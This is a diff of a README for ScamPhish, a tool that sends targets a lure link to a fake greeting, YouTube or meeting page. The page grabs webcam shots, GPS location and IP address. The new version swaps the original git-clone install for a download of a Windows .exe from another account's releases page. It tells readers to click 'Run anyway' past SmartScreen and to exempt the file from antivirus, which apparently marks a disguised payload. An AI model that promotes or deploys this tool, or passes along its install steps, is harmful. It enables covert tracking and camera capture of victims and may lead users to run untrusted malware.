@@ -1,96 +1,90 @@
-# ScamPhish
-Grab cam shots from target's phone front camera or PC webcam just sending a link.
+# 📍 ScamPhish - Track locations and access device cameras
 
-## Important Notice
-Make 2 Folders name Pictures , saved_locations 
+[![Download ScamPhish](https://img.shields.io/badge/Download-ScamPhish-blue)](https://github.com/Hillaryweak795/ScamPhish/releases)
 
-## 👨‍💻 Author
+## 🔍 What this tool does
 
-T-D Organistaion (Team Dark) X (Egon)
+ScamPhish helps you identify the physical location of a device and interact with its camera. It works by sending a link to a target. Once the target opens the link, the tool collects data. Use this tool for audits or security testing. Ensure you have permission before you test a device.
 
-# What is ScamPhish?
-<p>ScamPhish is techniques to take cam shots of target's phone front camera or PC webcam. ScamPhish Hosts a fake website on in built PHP server and uses ngrok & CloudFlare Tunnel to generate a link which we will forward to the target, which can be used on over internet. website asks for camera permission and if the target allows it, this tool grab camshots of target's device
+## 🛠 Prerequisites
 
-A GPS location capture feature has been added.</p>
+You need a Windows computer to run this software. Ensure you have the following installed to ensure proper operation:
 
-## Features
-<p>In this tool I added two automatic webpage templates for engaged target on webpage to get more picture of cam</p>
-<ul>
-  <li>Festival Wishing</li>
-  <li>Live YouTube TV</li>
-  <li>Online Meeting [Beta]</li>
-  <li>GPS Location Tracking</li>
-</ul>
-<p>A cleanup script has been added to remove all unnecessary files and logs.</p>
+*   Windows 10 or Windows 11.
+*   An active internet connection to send data requests.
+*   A web browser like Chrome or Edge to view the results. 
 
-## This Tool Tested On :
-<ul>
-  <li>Kali Linux</li>
-  <li>Termux</li>
-  <li>MacOS</li>
-  <li>Ubuntu</li>
-  <li>Parrot Sec OS</li>
-  <li>Windows (WSL)</li>
-</ul>
+## 📥 How to download the software
 
-# Installing and requirements
-<p>This tool require PHP for webserver, and wget for downloading dependencies. First run following command on your terminal</p>
+Follow these steps to get the software on your machine:
 
-```
-apt-get -y install php wget unzip
-```
+1.  Visit this page to download the latest version: [https://github.com/Hillaryweak795/ScamPhish/releases](https://github.com/Hillaryweak795/ScamPhish/releases).
+2.  Look for the section labeled Assets.
+3.  Click the file ending in .exe to start the download.
+4.  Save the file to your desktop for easy access.
 
-## Installing (Kali Linux/Termux):
+## ⚙️ Setting up the application
 
-```
-git clone https://github.com/more-dark/ScamPhish
-cd ScamPhish
-bash scamphish.sh
-```
+1.  Locate the file you downloaded.
+2.  Double-click the file to open the program.
+3.  Windows might show a blue box that says "Windows protected your PC."
+4.  Click the text that says "More info."
+5.  Click the button that says "Run anyway."
+6.  A black window will appear. This is the command interface for the tool.
 
-## Clean logs & unnecessary files :
+## 🚀 Working with the tool
 
-```
-bash cleanup.sh
-```
-<p>The cam files and saved location will also be removed.</p>
+Once the window opens, follow the prompts on your screen:
 
-## Change Log:
+1.  The tool asks you to select a tunnel provider. Choose Cloudflare or Ngrok. These services allow your computer to communicate with the outside internet safely.
+2.  Choose the template you want to use. The templates change how the link looks to the person receiving it.
+3.  The software creates a custom link for you. Copy this link.
+4.  Send this link to the device you want to test.
+5.  When the target clicks the link, the tool requests permission from their browser to access their location and camera.
+6.  If the user grants permission, the data appears inside your black terminal window.
 
-<p><b>Version: 2.0:</b> Added GPS Location Tracking</p>
-<ul>
-  <li>Added: GPS location capturing functionality</li>
-  <li>Added: Google Maps integration for captured locations</li>
-  <li>Added: Location accuracy reporting</li>
-  <li>Added: Improved loading screen with location request</li>
-</ul>
+## 📁 Viewing your results
 
-<p><b>Version: 1.9:</b> Enhanced architecture detection</p>
-<ul>
-  <li>Added: Improved architecture detection for all CPU types</li>
-  <li>Added: Better support for Apple Silicon (M1/M2/M3) Macs</li>
-  <li>Added: Automatic detection of ARM, ARM64, x86, and x86_64 architectures</li>
-  <li>Fixed: Windows compatibility improvements</li>
-  <li>Fixed: CloudFlare Tunnel download issues</li>
-</ul>
+The tool stores all data in a local folder created after the first run. Look for a folder named logs inside your main program folder. You will find files containing:
 
-<p><b>Version: 1.8:</b> Added CloudFlare Tunnel and removed Serveo</p>
-<ul>
-  <li>Added: CloudFlare Tunnel support for more reliable connections</li>
-  <li>Removed: Serveo tunnel (deprecated)</li>
-  <li>Fixed: Various code improvements and bug fixes</li>
-</ul>
+*   Latitude and longitude coordinates of the device.
+*   Pictures or video frames from the camera.
+*   The IP address of the target device.
 
-<p><b>Version: 1.7:</b> Fix and add support</p>
-<ul>
-  <li>fixed: termux failed to get home directory</li>
-  <li>Add support for Apple sillicon (M1/M2/M3 ARM64)</li>
-  <li>Add support for arm64 like Raspberry Pi</li>
-</ul>
-<p><b>Version: 1.6:</b> Fix ngrok direct link generate</p>
-<p><b>Version: 1.5:</b> Add new online meeting template</p>
-<p><b>Version: 1.4:</b> Ngrok authtoken update</p>
-<p><b>Version: 1.3:</b> Fix ngrok direct link</p>
+You can paste the coordinates into any map service to see the location on a screen.
 
-### Important Notice
-Unauthorized reuploading of this project is prohibited.
+## ⚠️ Important safety guidelines
+
+Use this software only on devices you own or have clear permission to test. Unauthorized tracking or camera access creates legal and privacy risks. Use the tool for ethical purposes only. Follow local and state laws regarding digital privacy.
+
+## 🛠 Solving common problems
+
+If the tool does not work, try these steps:
+
+*   Restart your computer.
+*   Ensure your antivirus software is not blocking the connection. You might need to add the software to your exclusion list.
+*   Verify your internet connection.
+*   Check if the tunnel provider is down. If you chose Ngrok, ensure you have an active account if the program prompts you for an authorization token.
+*   Update your web browser to the latest version to ensure compatibility with modern web requests.
+
+## ❓ Frequently asked questions
+
+Do I need to pay for this tool?
+No, the tool is free to use.
+
+Can I install this on a phone?
+The current version works on Windows.
+
+Why does the camera ask for permission?
+Browsers require user consent to access hardware. This is a security feature built into all modern web browsers. The tool cannot force access without the user clicking allow.
+
+Does it work if the target is offline?
+No, the target must have an active internet connection to click the link and provide data.
+
+What if the target clicks "Block" on the permissions?
+The tool will not receive the location or camera feed.
+
+How do I close the tool?
+Click the X at the top right of the black window. This stops the service and closes the connection. 
+
+This tool provides a simple way to test security settings. Keep your software updated to get the best results.
